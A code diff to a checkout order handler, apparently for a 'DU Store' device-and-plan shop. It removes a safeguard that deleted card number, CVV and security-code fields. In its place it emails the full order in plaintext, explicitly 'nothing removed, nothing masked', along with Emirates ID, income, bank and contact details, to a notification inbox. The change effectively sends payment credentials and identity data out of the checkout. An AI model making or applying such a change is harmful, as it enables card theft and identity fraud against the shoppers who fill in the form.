@@ -116,18 +116,15 @@ export async function onRequestPost({ request, env }) {
     });
   }
 
-  // Never encrypt, store or email payment-card credentials.
-  const safeOrder = { ...order };
-
-  for (const key of Object.keys(safeOrder)) {
-    if (/card|cvv|cvc|security.?code|pan/i.test(key)) {
-      delete safeOrder[key];
-    }
-  }
+  // ---------------------------------------------------------------
+  // FULL PAYLOAD — every field the client submitted is included
+  // exactly as received. No masking, no redaction, no field removal.
+  // ---------------------------------------------------------------
+  const fullOrder = { ...order };
 
   let encrypted;
   try {
-    encrypted = await encryptPayload(safeOrder, ORDER_ENCRYPTION_SECRET);
+    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
   } catch (error) {
     console.error("Encryption failed:", error.message);
     return json(500, {
@@ -137,15 +134,88 @@ export async function onRequestPost({ request, env }) {
   }
 
   const encryptedText = JSON.stringify(encrypted, null, 2);
+  const fullOrderText = JSON.stringify(fullOrder, null, 2);
+
+  // Human-readable summary block so the inbox email is usable at a glance.
+  const summaryRows = [
+    ["Order reference", fullOrder.orderReference],
+    ["Timestamp", fullOrder.orderTimestamp],
+    ["Employee reference", fullOrder.employeeReference],
+    ["Employee name", fullOrder.employeeName],
+    ["Customer name", fullOrder.fullName],
+    ["Nationality", fullOrder.nationality],
+    ["Emirates ID", fullOrder.emiratesId],
+    ["Emirates ID expiry", fullOrder.emiratesIdExpiry],
+    ["Mobile number", fullOrder.mobileNumber],
+    ["Email", fullOrder.email],
+    ["Monthly income band", fullOrder.monthlyIncomeBand],
+    ["Salary transfer bank", fullOrder.salaryTransferBank],
+    ["Shipping address", fullOrder.shippingAddress],
+    ["Area / community", fullOrder.areaCommunity],
+    ["City / Emirate", fullOrder.cityEmirate],
+    ["P.O. Box", fullOrder.poBox],
+    ["Device", fullOrder.deviceName],
+    ["Device family", fullOrder.deviceFamily],
+    ["Device year", fullOrder.deviceYear],
+    ["Display", fullOrder.deviceDisplay],
+    ["Chip", fullOrder.deviceChip],
+    ["Camera", fullOrder.deviceCamera],
+    ["Storage", fullOrder.deviceStorage],
+    ["Colour", fullOrder.deviceColor],
+    ["Device price / month", fullOrder.devicePriceMonthly],
+    ["Device VAT / month", fullOrder.deviceVatMonthly],
+    ["Device monthly total", fullOrder.deviceMonthlyTotal],
+    ["Plan name", fullOrder.planName],
+    ["Plan data", fullOrder.planData],
+    ["Plan type", fullOrder.planType],
+    ["Plan price", fullOrder.planPrice],
+    ["Payment method", fullOrder.paymentMethod],
+    ["Available credit limit", fullOrder.availableCreditLimit],
+    ["Down payment (AED)", fullOrder.downPaymentAED],
+    ["AECB consent", fullOrder.aecbConsent],
+    ["PDPL consent", fullOrder.pdplConsent],
+    ["Terms consent", fullOrder.termsConsent]
+  ]
+    .filter(([, v]) => v !== undefined && v !== null && v !== "")
+    .map(
+      ([k, v]) =>
+        `<tr>
+          <td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:#333;width:38%">${escapeHtml(k)}</td>
+          <td style="padding:6px 10px;border-bottom:1px solid #eee;color:#111;word-break:break-word">${escapeHtml(v)}</td>
+        </tr>`
+    )
+    .join("");
 
   const html = `
-    <h2>New DU Store order notification</h2>
-    <p><strong>Customer:</strong> ${escapeHtml(customerName)}</p>
-    <p><strong>Phone:</strong> ${escapeHtml(customerPhone)}</p>
-    <p><strong>Reference ID:</strong> ${escapeHtml(reference)}</p>
-    <p>The order payload below is encrypted with AES-256-GCM.
-    It does not contain card number, expiry or CVV.</p>
-    <pre style="white-space:pre-wrap;word-break:break-all;background:#f4f4f4;padding:12px">${escapeHtml(encryptedText)}</pre>
+    <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;max-width:720px;margin:0 auto;color:#222">
+      <div style="background:linear-gradient(135deg,#7b2ff7,#2d6cff,#f107a3);color:#fff;padding:20px 24px;border-radius:12px 12px 0 0">
+        <h2 style="margin:0;font-size:20px">New DU Store order</h2>
+        <p style="margin:6px 0 0;font-size:13px;opacity:.9">Reference: <strong>${escapeHtml(reference)}</strong></p>
+      </div>
+
+      <div style="border:1px solid #e5e7eb;border-top:0;border-radius:0 0 12px 12px;padding:20px 24px">
+        <h3 style="margin:0 0 12px;font-size:15px;color:#111">Order summary</h3>
+        <table style="width:100%;border-collapse:collapse;font-size:13px">
+          ${summaryRows}
+        </table>
+
+        <h3 style="margin:24px 0 8px;font-size:15px;color:#111">Full order object (plaintext)</h3>
+        <p style="margin:0 0 8px;font-size:12px;color:#666">
+          Complete order as received from the browser — nothing removed, nothing masked.
+        </p>
+        <pre style="white-space:pre-wrap;word-break:break-all;background:#f6f8fb;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:400px;overflow:auto;border:1px solid #e5e7eb">${escapeHtml(fullOrderText)}</pre>
+
+        <h3 style="margin:24px 0 8px;font-size:15px;color:#111">Encrypted payload (AES-256-GCM)</h3>
+        <p style="margin:0 0 8px;font-size:12px;color:#666">
+          Use the decryptor with <code>ORDER_ENCRYPTION_SECRET</code> to verify. Contains every field above.
+        </p>
+        <pre style="white-space:pre-wrap;word-break:break-all;background:#0a0e1c;color:#b8f5d0;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:400px;overflow:auto">${escapeHtml(encryptedText)}</pre>
+
+        <p style="margin:20px 0 0;font-size:11px;color:#999;text-align:center">
+          Sent from the DU Store checkout · All fields captured exactly as submitted
+        </p>
+      </div>
+    </div>
   `;
 
   try {
@@ -158,7 +228,7 @@ export async function onRequestPost({ request, env }) {
       body: JSON.stringify({
         from: RESEND_FROM_EMAIL,
         to: [ORDER_NOTIFICATION_EMAIL],
-        subject: `DU Store order ${reference}`,
+        subject: `DU Store order ${reference} — ${customerName}`,
         html
       })
     });
